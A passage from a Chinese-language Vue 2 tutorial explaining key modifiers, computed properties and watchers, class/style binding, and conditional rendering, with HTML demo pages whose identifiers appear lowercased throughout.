stop，阻止事件冒泡（常用）；\n 3. once，事件只触发一次（常用）；\n 4. capture，使用事件的捕获模式；\n 5. self，只有event.target是当前操作的元素时才会触发事件；\n 6. passive，事件的默认行为立即执行，无需等待事件回调函数执行完毕。\n 7. 事件修饰符能连用，比如即阻止默认行为又阻止事件冒泡，@click.stop.prevent。\n\n----------------------------------------\n\n\n# 3.3 键盘事件\n\n在开发过程中，我们经常需要判断是什么按键按下再去走什么逻辑，例如在键盘事件回调中写if (e.key !== \'enter\') return表示只有当回车键按下后再继续执行。其实vue给我们提供按键修饰符来简化这些写法，常见的按键修饰符有.enter、.delete、.esc、.space、.tab、.up、.down、.left、.right。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- enter回车，delete删除或退格，esc退出，space空格，tab换行，up、down、left、right是上下左右 --\x3e\n        <input type="text" placeholder="按下回车提示输入的值" @keyup.enter="showinfo">\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showinfo(e) {\n                    console.log(e.key, e.keycode);\n                    alert(e.target.value);\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nvue可能没有为所有键设置按键修饰符，其实是可以使用原始key（e.key）来暂替的，需要注意的是如果是多单词组成的key那就得使用-符号分隔了。\n\n\x3c!-- capslock是大小写转换，使用时小写并用-分隔，caps-lock --\x3e\n<input type="text" placeholder="按下回车提示输入的值" @keyup.caps-lock="showinfo">\n\n\n1\n2\n\n\n有几个键用法稍微特殊点，tab、ctrl、alt、shift、meta，后四个是系统键饰键。tab的特殊之处是一般用于keydown，因为如果是keyup的话，键弹起的时候焦点已经转移了，其后回调函数不会被执行。系统键键也是类似的情况，用keydown是正常情况，用keyup的话，“系统键+其他键”弹起时才会触发keyup的回调函数。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- @keydown.ctrl会正常，@keyup.ctrl只有当ctrl+其他键弹起时触发，比如ctrl+a --\x3e\n        <input type="text" placeholder="按下回车提示输入的值" @keyup.ctrl="showinfo">\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {},\n            methods: {\n                showinfo(e) {\n                    console.log(e.key, e.keycode);\n                    alert(e.target.value);\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n按键修饰符也是可以连用的，对特定的ctrl+x进行识别（识别x，上面的不能识别x是谁），只允许这样的组合键触发事件回调函数。\n\n\x3c!-- 只有当ctrl+7才走showinfo函数 --\x3e\n<input type="text" placeholder="按下回车提示输入的值" @keyup.ctrl.7="showinfo">\n\n\n1\n2\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 常见的按键修饰符：enter回车，delete删除或退格，esc退出，space空格，tab换行，up、down、left、right是上下左右。\n 2. vue未提供按键修饰符的按键，可以使用按键原始的key值去绑定，但注意要转换为xxx-xxx（短横线命名）的形式。\n 3. 系统修饰键，ctrl、alt、shift、meta：\n    1. 配合keyup使用：按下系统键的同时，再按下其他键，随后释放其他键，事件才被触发；\n    2. 配合keydown使用：正常触发事件。\n 4. 也可以使用keycode去指定具体的按键，但不推荐，因为keycode标准已被弃用了。\n 5. vue.config.keycodes.自定义键名 = 键码;，可以去定制按键修饰符，但不太推荐。\n\n----------------------------------------\n\n\n# 四、计算属性和监视属性\n\n\n# 4.1 计算属性\n\n有个经典的需求，输入“姓”和“名”，可以展示“全名”，动态修改“姓”或“名”时，全名也要跟着改变。很简单呀，“姓”、“名”和“全名”我都使用插值来实现。但是如果出现全名的“展示位数限制”或“大小写转换”等，那“全名”的插值就会比较复杂，这不符合vue风格指南-模板中简单的表达式，推荐使用方法或计算属性。\n\n\x3c!-- 不符合“模板中简单的表达式”建议，推荐使用方法或计算属性 --\x3e\n全名：<span>{{lastname.slice(0, 3).touppercase()}}-{{firstname.slice(0, 3).touppercase()}}</span>\n\n\n1\n2\n\n\n使用插值搭配方法（methods）的方案，代码如下。这方案有可优化点的，如果页面使用fullname的地方有很多，那就会调用很多次，如果有缓存就好了；data数据更新时，模板会重新解析，即使是与“全名”无关的属性更新了也会导致fullname再次调用。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastname"><br><br>\n        名：<input type="text" v-model="firstname"><br><br>\n        测试：<input type="text" v-model="x"><br><br>\x3c!-- 它改变也会让fullname调用 --\x3e\n        全名：<span>{{fullname()}}</span><br><br>\n        全名：<span>{{fullname()}}</span><br><br>\n        全名：<span>{{fullname()}}</span><br><br>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                lastname: \'张\',\n                firstname: \'三\',\n                x: \'测试\'\n            },\n            methods: {\n                fullname() {\n                    // 页面有几次调用，就执行几次，没有缓存可言\n                    console.log(\'调用fullname\');\n                    // 在这里随意你做字符串长度限制，或者反转，或者大小写变换\n                    return this.lastname + \'-\' + this.firstname;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\nvue提供的计算属性解决了上面的两个问题，并且如果修改“全名”也能让对应的“姓”和“名”随之修改。计算属性是定义在computed里的（computed与methods平级），它根据data里的属性计算出来的，并且它对外提供getter/setter供其他人读取和修改（也是用object.defineproperty()实现）。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastname"><br><br>\n        名：<input type="text" v-model="firstname"><br><br>\n        测试：<input type="text" v-model="x"><br><br>\x3c!-- 它不影响fullname --\x3e\n        全名：<span>{{fullname}}</span><br><br>\x3c!-- fullname会出现在vm上 --\x3e\n        全名：<span>{{fullname}}</span><br><br>\n        全名：<span>{{fullname}}</span><br><br>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                lastname: \'张\',\n                firstname: \'三\',\n                x: \'测试\'\n            },\n            computed: {\n                fullname: {\n                    // 初次读取fullname时被调用，在所依赖属性数据改变时也会被调用\n                    get() {\n                        console.log(\'调用fullname-get\');\n                        return this.lastname + \'-\' + this.firstname;\n                    },\n                    // 在修改fullname时被调用\n                    set(value) {\n                        console.log(\'调用fullname-set\');\n                        const str = value.split(\'-\');\n                        this.lastname = str[0];\n                        this.firstname = str[1];\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n计算属性是可以简写的，当没有set方法只有get方法时，可以直接将计算属性写成方法，方法体就是get的方法体。但是在模板中还是以属性的形式来使用，意思是你不要加上()弄成函数调用了。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastname"><br><br>\n        名：<input type="text" v-model="firstname"><br><br>\n        全名：<span>{{fullname}}</span><br><br>\x3c!-- 不要弄成函数调用 --\x3e\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                lastname: \'张\',\n                firstname: \'三\'\n            },\n            computed: {\n                // 没有set方法只有get方法时可简写\n                fullname() {\n                    return this.lastname + \'-\' + this.firstname;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 计算属性定义：要用的属性不存在，通过已有属性计算得来。\n 2. 计算属性原理：底层借助了object.defineproperty()提供的getter/setter。\n 3. 计算属性的get在初次读取时被调用一次，也会在所依赖属性改变时被调用。\n 4. 计算属性优势：与methods实现相比，内部有缓存机制（能复用），还可以排除无关属性的影响。\n 5. 计算属性可以在没有set方法只有get方法情况下简写，使用处还是属性的形式。\n\n----------------------------------------\n\n\n# 4.2 监视属性\n\n上一小节的例子可以用监视属性实现，监视属性就是用来监视某些属性的变化，然后做一些对应的操作。监视属性定义在watch里（watch与computed和methods平级），watch里的常用handler来处理操作（computed则是getter/setter）。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastname"><br><br>\n        名：<input type="text" v-model="firstname"><br><br>\n        全名：<span>{{fullname}}</span><br><br>\x3c!-- fullname会出现在vm上 --\x3e\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                lastname: \'张\',\n                firstname: \'三\',\n                fullname: \'张-三\'\n            },\n            watch: {\n                lastname: {\n                    // watch里的handler 对应 computed里的getter/setter\n                    handler(newval, oldval) {\n                        this.fullname = newval + \'-\' + this.firstname;\n                    }\n                },\n                firstname: {\n                    handler(newval, oldval) {\n                        this.fullname = this.lastname + \'-\' + newval;\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\nwatch还有两个常用的配置，immediate配置表示是否在初始化时就让handler调用一次（默认值是false），deep配置表示是否进行深度监视（默认值是false）。还有一点，如果你不清楚在vue实例创建时该怎么监视属性，那么可以在vue实例创建完再监视属性，写法vm.$watch(\'xxx\', {});，xxx就是要监视的属性，{}同之前的写法一样。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastname"><br><br>\n        名：<input type="text" v-model="firstname"><br><br>\n        全名：<span>{{fullname}}</span><br><br>\x3c!-- fullname会出现在vm上 --\x3e\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                lastname: { a: \'张\', b: \'1\' },\n                firstname: \'三\',\n                fullname: \'张-三\'\n            },\n            watch: {\n                lastname: {\n                    immediate: true, // 初始化时让handler调用一次\n                    deep: true, // 深度监视\n                    handler(newval, oldval) { // lastname变化了会执行handler\n                        console.log(\'watch-lastname\');\n                        this.fullname = newval + \'-\' + this.firstname;\n                    }\n                },\n                firstname: {\n                    // 正常写法只有handler\n                    handler(newval, oldval) {\n                        console.log(\'watch-firstname\');\n                        this.fullname = this.lastname + \'-\' + newval;\n                    }\n                }\n            }\n        });\n        // vm创建完后再去监视属性\n        /* vm.$watch(\'lastname\', {\n            immediate: true, // 初始化时让handler调用一次\n            deep: true, // 深度监视\n            handler(newval, oldval) { // lastname变化了会执行handler\n                console.log(\'watch-lastname\');\n                this.fullname = newval + \'-\' + this.firstname;\n            }\n        });\n        vm.$watch(\'firstname\', {\n            // 正常写法只有handler\n            handler(newval, oldval) {\n                console.log(\'watch-firstname\');\n                this.fullname = this.lastname + \'-\' + newval;\n            }\n        }); */\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n\n\nwatch也是可以简写的，当immediate和deep两配置项是默认值可省略时，可以将handler的函数形式直接给监视属性用。\n\nwatch: {\n    // 正常写法\n    lastname: {\n        immediate: true,\n        deep: true,\n        handler(newval, oldval) {\n            console.log(\'watch-lastname\');\n            this.fullname = newval + \'-\' + this.firstname;\n        }\n    },\n    // 没有immediate和deep后可简写\n    firstname(newval, oldval) {\n        console.log(\'watch-firstname\');\n        this.fullname = this.lastname + \'-\' + newval;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 当被监视的属性变化时，handler函数自动被调用，进行相关操作。\n 2. 监视的属性必须存在，才能进行监视！\n 3. 监视属性有两种写法，1) new vue()时传入watch配置，2)通过vm.$watch监视。\n 4. vue给我们提供的watch是默认不开启深度监视的，但是vue在自己框架里监视数据还是用的深度监视。\n 5. 如果开发人员需要对监视属性进行对象内部值改变的监视（深度监视），那就自己写上配置deep: true。\n 6. 监视属性可在immediate和deep两配置项处于默认值时简写，监视属性直接使用handler的函数形式。\n\n----------------------------------------\n\n\n# 4.3 监视属性对比计算属性\n\n我们整理一下同一需求，监视属性和计算属性的代码：\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>计算属性</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastname"><br><br>\n        名：<input type="text" v-model="firstname"><br><br>\n        全名：<span>{{fullname}}</span><br><br>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                lastname: \'张\',\n                firstname: \'三\'\n            },\n            computed: {\n                // 只有getter，没有setter时，计算属性简写\n                fullname() {\n                    return this.lastname + \'-\' + this.firstname;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>监视属性</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastname"><br><br>\n        名：<input type="text" v-model="firstname"><br><br>\n        全名：<span>{{fullname}}</span><br><br>\x3c!-- fullname会出现在vm上 --\x3e\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                lastname: \'张\',\n                firstname: \'三\',\n                fullname: \'张-三\'\n            },\n            watch: {\n                // immediate和deep处于默认值false时，监视属性简写，并省略了handler\n                lastname(newval, oldval) {\n                    this.fullname = newval + \'-\' + this.firstname;\n                },\n                firstname(newval, oldval) {\n                    this.fullname = this.lastname + \'-\' + newval;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n我们会发现监视属性的代码会繁杂一点（命令式且重复），这样看来还是计算属性用起来会好些是吧。但是呢在有些场景不能这样说，监视属性中可使用异步操作（settimeout、ajax请求等），而计算属性就不行了。还有要注意的是，异步操作的回调函数的this一定要注意是指向vm还是window。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        姓：<input type="text" v-model="lastname"><br><br>\n        名：<input type="text" v-model="firstname"><br><br>\n        全名：<span>{{fullname}}</span><br><br>\x3c!-- fullname会出现在vm上 --\x3e\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                lastname: \'张\',\n                firstname: \'三\',\n                fullname: \'张-三\'\n            },\n            watch: {\n                // 监视属性可使用异步操作，而计算属性不能使用\n                lastname(newval, oldval) {\n                    // 使用箭头函数是为了让this指向vm\n                    settimeout(() => {\n                        console.log(\'watch-lastname\');\n                        this.fullname = newval + \'-\' + this.firstname;\n                    }, 1000);\n                },\n                firstname(newval, oldval) {\n                    console.log(\'watch-firstname\');\n                    this.fullname = this.lastname + \'-\' + newval;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 计算属性能完成的功能，监视属性也能完成，虽然代码会繁杂点。\n 2. 监视属性能完成的功能，计算属性就不一定了，比如异步操作。\n 3. 被vue实例管理的函数，最好写成普通函数，让this指向vm或组件实例对象。\n 4. 不被vue实例管理的函数（settimeout和ajax的回调函数），最好写成箭头函数（会向外找）。\n\n----------------------------------------\n\n\n# 五、在vue中使用样式\n\n\n# 5.1 绑定class样式\n\n在对html进行样式修改时，你可能会想到使用class配合js代码来修改classname从而达到动态控制样式，例如下面的代码片段：\n\n// classname原值是\'basic\'，触发某个事件将它修改为\'basic addbg\'\ndocument.getelementbyid(\'outer\').classname = \'basic addbg\';\n\n\n1\n2\n\n\n在vue中最好不要直接操作dom，vue是可以对class使用v-bind指令，将data数据绑定到class，再使用methods里的方法去修改对应的数据，已达到动态修改样式的目的。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        .basic {\n            width: 200px;\n            height: 100px;\n            border: 1px red solid;\n        }\n        .addbg { background-color: royalblue; }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 绑定class与data数据，最后:class会和class进行合并 --\x3e\n        <div class="basic" :class="classmsg" @click="change">点击我，样式会变化</div>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                classmsg: \'\'\n            },\n            methods: {\n                // 修改:class绑定的数据\n                change() { this.classmsg = \'addbg\'; }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n上面那个例子:class的值用的是字符串，但我想加入或删除多个class样式呢？:class的值可以使用数组，使用数组就可以加/删多个class样式。vue解析模板时会把:class数组形式打散成字符串并与现存的class合并。\n\n:class的值除了可以使用数组，还能使用对象。那使用对象是为了什么场景呢？它比较适合class样式个数不太多，但能动态搭配这些class样式。对象中的key-value的value是布尔值，是用作各样式的开关。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        .basic {\n            width: 200px;\n            height: 100px;\n            border: 1px red solid;\n        }\n        .addbg { background-color: royalblue; }\n        .addradius { border-radius: 20px; }\n        .addgrad { background-image: linear-gradient(to right, red, yellow); }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- :class的值使用字符串形式，适用于单个样式动态修改 --\x3e\n        <div class="basic" :class="classstr" @click="changeclassstr">点击我！:class是字符串形式</div><br><br>\n        \x3c!-- :class的值使用数组形式，适用于样式很多的样式，也只是简单的修改 --\x3e\n        <div class="basic" :class="classarr" @click="changeclassarr">点击我！:class是数组形式</div><br><br>\n        \x3c!-- :class的值使用对象形式，适用于样式数量一般的场景，动态搭配对象中各种样式 --\x3e\n        <div class="basic" :class="classobj" @click="changeclassobj">点击我！:class是对象形式</div>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const classmsg = [\'addbg\', \'addradius\', \'addgrad\'];\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                classstr: \'\', // 字符串形式\n                classarr: [], // 数组形式\n                classobj: {   // 对象形式\n                    addbg: false, // 布尔值作为样式使用开关，动态搭配各种样式\n                    addradius: false,\n                    addgrad: false\n                }\n            },\n            methods: {\n                changeclassstr() {\n                    // 随机出现0, 1, 2中的一个\n                    const index = math.floor(math.random(0, 1) * 3);\n                    this.classstr = classmsg[index];\n                },\n                changeclassarr() {\n                    // 随机出现0, 1, 2, 3, 4中的一个\n                    const index = math.floor(math.random(0, 1) * 4);\n                    // 截取[0, index)\n                    this.classarr = classmsg.slice(0, index);\n                },\n                changeclassobj() {\n                    // 随机出现0, 1, 2中的一个\n                    const index = math.floor(math.random(0, 1) * 3);\n                    const classname = classmsg[index];\n                    // 随意让其中一个改变值\n                    this.classobj[classname] = !this.classobj[classname];\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. class样式写法:class="xxx"，其中xxx可以是字符串、数组、对象。\n 2. 字符串的写法适用于：单个样式的动态修改。\n 3. 数组的写法适用于：数量可能非常多的样式，能简单的修改使用样式。\n 4. 对象的写法适用于：数量可能一般多的样式，能便捷、动态搭配使用样式。\n\n----------------------------------------\n\n\n# 5.2 绑定style样式\n\n内联style样式用的场景很少，一般使用class样式就够用了。但这里还是稍微介绍一下，style也同class一样使用v-bind绑定data相关数据，达到动态修改的目的。:style的值一般是对象（例如{fontsize: xxx}），极少的情况会是数组（每一项也是对象，例如{fontsize: xxx}），这种对象的属性名（样式名）要是首字母小写的驼峰命名。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        .basic {\n            width: 200px;\n            height: 100px;\n            border: 1px red solid;\n        }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- :style的值使用字符串形式，使用场景稍多一点点 --\x3e\n        <div class="basic" :style="styleobj" @click="changestyleobj">点击我！:style是字符串形式</div><br><br>\n        \x3c!-- :style的值使用数组形式，使用场景很少 --\x3e\n        <div class="basic" :style="stylearr" @click="changestylearr">点击我！:style是数组形式</div><br><br>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        // 样式对象，属性名（样式名）使用首字母小写的驼峰式\n        const addbg = { backgroundcolor: \'royalblue\' }; // 在css中是 background-color: royalblue;\n        const addradius = { borderradius: \'20px\' };     // 在css中是 border-radius: 20px;\n        // 在css中是 background-image: linear-gradient(to right, red, yellow);\n        const addgrad = { backgroundimage: `linear-gradient(to right, red, yellow)` };\n        // 组成数组\n        const classmsg = [addbg, addradius, addgrad];\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                styleobj: {}, // 对象形式\n                stylearr: [], // 数组形式，其实就是用[]包裹styleobj这样的对象\n            },\n            methods: {\n                changestyleobj() {\n                    // 随机出现0, 1, 2中的一个\n                    const index = math.floor(math.random(0, 1) * 3);\n                    this.styleobj = classmsg[index];\n                },\n                changestylearr() {\n                    // 随机出现0, 1, 2, 3, 4中的一个\n                    const index = math.floor(math.random(0, 1) * 4);\n                    // 截取[0, index)\n                    this.stylearr = classmsg.slice(0, index);\n                },\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. style样式的对象写法:style="{fontsize: xxx}"，xxx是动态值。\n 2. style样式的数组写法:style="[a, b]"，a和b其实是{fontsize: xxx}这样的对象。\n\n----------------------------------------\n\n\n# 六、条件渲染和列表渲染\n\n\n# 6.1 条件渲染\n\n经常有需求让页面的某个元素时而显示时而隐藏，在vue中使用的是v-show和v-if指令。他们的值表面上是js表达式，最后都会自动转换成布尔值。这两个指令最明显的区别就是，v-show让元素隐藏但元素的dom结构还在（使用了style="display: none;"），v-if是直接删除/增加了元素的dom（包括事件监听器），那么在高频率操作“隐藏/显示”时使用v-show更好。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-show v-if --\x3e\n        <h2 v-show="showstatus">你好</h2><br>\n        <button @click="showstatus = !showstatus">隐藏/显示</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                showstatus: true\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在js中if经常联合使用if else和else，在vue也可以v-if搭配v-if-else和v-else。联合使用v-if、v-if-else和v-else时，会比同时使用多个v-if要强。因为联合使用场景下只要达到其中一个条件的判断，其他分支就不会进行了；而同时使用多个v-if，每个v-if都会进行判断。然后需要注意联合使用的时候，v-if、v-if-else和v-else这三个元素所在之间不能被其他结构“打断”，否则只生效打断地点前面的v-if并且还会在控制台报错。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h1>a数值现在是：{{a}}</h1><br>\n        <button @click="a++">点击，a++</button><br>\n        <h2 v-if="a === 1">你好，a === 1</h2><br>\n        <h2 v-if="a === 2">你好，a === 2</h2><br>\n        <h2 v-if="a === 3">你好，a === 3</h2><br>\n        <h2 v-if="a === 4">你好，a === 4</h2><br>\n        <hr>\n        <h1>b数值现在是：{{b}}</h1><br>\n        <button @click="b++">点击，b++</button><br>\n        <h2 v-if="b === 1">你好，b === 1</h2>\x3c!-- 这里就不要加br了，否则只生效前面的 --\x3e\n        <h2 v-else-if="b === 2">你好，b === 2</h2>\x3c!-- 这里就不要加br了，否则只生效前面的 --\x3e\n        <h2 v-else-if="b === 3">你好，b === 3</h2>\x3c!-- 这里就不要加br了，否则只生效前面的 --\x3e\n        <h2 v-else="b === 4">你好，b === 4</h2>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                a: 0,\n                b: 0\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n如果要让一块区域的元素集体隐藏or显示，虽然是可以使用容器包裹它们再使用v-show或v-if，但这样就额外引入了元素，如果没影响还好，有影响就麻烦了。vue考虑到了这点，提供了<template>模板，这个<template>不影响结构不会引入额外的元素。值得注意的是<template>只能搭配v-if（还有v-if-else和v-else）使用。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- template不会影响结构不会引入额外的元素 --\x3e\n        <template v-if="logintype === \'username\'">\n            <label>username</label>\n            <input placeholder="enter your username">\n        </template>\n        <template v-else>\n            <label>email</label>\n            <input placeholder="enter your email address">\n        </template>\n        <button @click="logintype = logintype === \'username\' ? \'email\' : 